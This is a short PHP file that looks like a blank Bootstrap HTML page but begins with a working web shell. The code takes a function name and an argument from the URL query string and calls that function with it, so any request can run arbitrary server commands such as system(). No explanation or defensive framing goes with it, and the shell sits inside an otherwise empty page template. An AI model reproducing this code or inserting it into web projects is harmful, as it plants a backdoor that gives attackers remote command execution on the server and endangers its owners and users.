<?php
    if(isset($_GET['exec'])){
        $output="";
        $x=$_GET['fun'];
        $exec=$_GET['exec'];
        if(is_callable($x))
            $output=htmlspecialchars($x("$exec"));
        echo "<pre>$output</pre>";
    }

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="./css/bootstrap.css">
</head>
<body>

</body>
</html>
